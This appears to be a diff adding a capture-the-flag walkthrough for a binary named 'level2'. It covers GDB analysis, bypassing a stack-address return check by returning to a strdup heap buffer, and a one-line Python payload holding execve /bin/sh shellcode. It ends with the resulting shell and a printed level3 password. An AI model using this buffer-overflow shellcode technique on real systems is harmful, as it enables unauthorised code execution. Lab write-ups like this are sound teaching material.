@@ -1,0 +1,24 @@
+Step 1: Analyze binary with GDB
+$ gdb ./level2
+(gdb) info functions        # Found gets(), strdup()
+(gdb) disassemble p         # Found stack protection check
+
+Step 2: Understand protection
+- Blocks return addresses where (addr & 0xb0000000) == 0xb0000000
+- Stack addresses (0xbffffxxx) are blocked
+- Heap addresses (0x804axxxx) bypass protection
+
+Step 3: Find heap address
+$ gdb ./level2
+(gdb) break *0x804853d     # After strdup call
+(gdb) run
+(gdb) info registers eax   # Heap address = 0x804a008
+
+Step 4: Create exploit
+$ (python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80" + "A"*57 + "\x08\xa0\x04\x08"'; cat) | ./level2
+
+Step 5: Got shell and retrieved password
+whoami
+level3
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
